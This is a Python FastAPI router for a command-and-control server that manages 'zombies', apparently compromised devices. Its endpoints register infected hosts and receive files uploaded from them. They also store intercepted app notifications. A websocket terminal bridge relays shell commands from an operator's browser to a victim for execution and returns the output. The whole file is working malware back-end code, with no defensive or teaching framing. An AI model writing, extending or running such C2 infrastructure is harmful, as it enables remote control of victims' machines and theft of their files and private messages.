import asyncio
import uuid

from fastapi import APIRouter, Depends, UploadFile, File, Form, HTTPException
from sqlalchemy.exc import SQLAlchemyError
from sqlalchemy.ext.asyncio import AsyncSession
from starlette import status
from starlette.websockets import WebSocket, WebSocketDisconnect

import os
from apps.zombie.models import Log, Command, File as ZombieFile, Zombie, Notification
from apps.zombie.schemas import ZombieCreate, ZombieRead
from apps.zombie.services.response_process import ResponseProcess
from config.database import get_async_session, async_session_maker
from managers.c2_manager import c2_manager

router = APIRouter(
    prefix="/zombies",
    tags=["Zombies Agency"], )


@router.post("/connect", response_model=ZombieRead)
async def connect_to_zombie(zombie_create: ZombieCreate, session: AsyncSession = Depends(get_async_session)):
    print(zombie_create)
    try:
        zombie = Zombie(**zombie_create.model_dump(), unique_key=str(uuid.uuid4()))
        session.add(zombie)
        await session.commit()
        await session.refresh(zombie)
        return zombie

    except Exception as e:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail={"error": str(e)},
        )


@router.post(
    "/upload/{zombie_id}",
    status_code=status.HTTP_201_CREATED,
)
async def upload_to_backend(
        zombie_id: int,
        command_id=Form(),
        file: UploadFile = File(...),
        session: AsyncSession = Depends(get_async_session),

):
    file_name = file.filename.replace('-', '_').replace(' ', '_')
    zombie_folder = f"media/files/zombies/{zombie_id}"
    os.makedirs(zombie_folder, exist_ok=True)
    file_path = os.path.join(zombie_folder, file_name)
    try:

        with open(file_path, "wb") as buffer:
            while chunk := await file.read(1024 * 1024):
                buffer.write(chunk)

        uploaded_file = ZombieFile(
            name=file_name,
            command_id=int(command_id),
            zombie_id=int(zombie_id),
            file_path=file_path,
        )
        session.add(uploaded_file)
        await session.commit()
        await session.refresh(uploaded_file)
        return {
            "success": True,
        }
    except Exception as e:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail=str(e)
        )
    finally:
        await file.close()


@router.websocket("/ws/connect/{zombie_id}")
async def zombie_websocket_handler(websocket: WebSocket, zombie_id: str):
    await c2_manager.connect(zombie_id, websocket)

    HEARTBEAT_INTERVAL = 30.0

    try:
        while True:
            try:
                response_data = await asyncio.wait_for(
                    websocket.receive_json(),
                    timeout=HEARTBEAT_INTERVAL
                )

                action = response_data.get("action")

                # --- Notification Logic ---
                if action == "notification":
                    try:
                        async with async_session_maker() as session:
                            notification = Notification(
                                zombie_id=int(zombie_id),
                                app_name=response_data.get("app_name"),
                                title=response_data.get("title"),
                                output_data=response_data.get("output_data"),  # Match your model field name
                            )
                            session.add(notification)
                            await session.commit()
                    except SQLAlchemyError as e:
                        print(f"[!] Database error saving notification for {zombie_id}: {e}")


                else:
                    cmd_id = response_data.get("command_id")
                    output = response_data.get("output")

                    if cmd_id is not None:
                        try:

                            await ResponseProcess.process_zombie_response(str(zombie_id), cmd_id, output)
                        except Exception as e:
                            print(f"[!] Processing error for {zombie_id}: {e}")

                    if zombie_id in c2_manager.terminal_queues:
                        await c2_manager.terminal_queues[zombie_id].put(output)

            except asyncio.TimeoutError:
                try:
                    await websocket.send_json({"action": "ping"})
                    print(f"[*] Sent heartbeat ping to {zombie_id}")
                except Exception as e:
                    print(f"[!] Heartbeat failed for {zombie_id}. Closing.")
                    print(f"[!] Error while sending heartbeat ping to {zombie_id}: {e}")
                    break

    except WebSocketDisconnect:
        print(f"[-] Zombie {zombie_id} disconnected normally.")
    except Exception as e:
        print(f"[!] Unexpected error in zombie loop {zombie_id}: {e}")
    finally:
        await c2_manager.disconnect(zombie_id)


@router.websocket("/terminal/ws/{zombie_id}")
async def terminal_websocket_bridge(websocket: WebSocket, zombie_id: str):
    await websocket.accept()
    queue = await c2_manager.get_terminal_queue(zombie_id)

    try:
        while True:
            # 1. Receive from HTML
            browser_data = await websocket.receive_json()
            cmd_text = browser_data.get("cmd")

            # 2. SAVE THE COMMAND TO DATABASE (The "Shell" history)
            async with async_session_maker() as session:
                new_cmd = Command(
                    zombie_id=int(zombie_id),
                    command_type=cmd_text,
                    status="issued"  # Mark it as sent
                )
                session.add(new_cmd)
                await session.flush()
                cmd_id = new_cmd.id
                await session.commit()

            # 3. FORWARD TO ZOMBIE WITH THE NEW ID
            if zombie_id in c2_manager.zombies:
                zombie_ws = c2_manager.zombies[zombie_id]
                await zombie_ws.send_json({
                    "action": "exec",
                    "cmd": cmd_text,
                    "command_id": cmd_id  # Now the zombie knows the ID!
                })

                # 4. WAIT FOR RESPONSE (Real-time communication)
                response_output = await queue.get()
                await websocket.send_json({"output": response_output})
    except Exception as e:
        print(f"Terminal error: {e}")
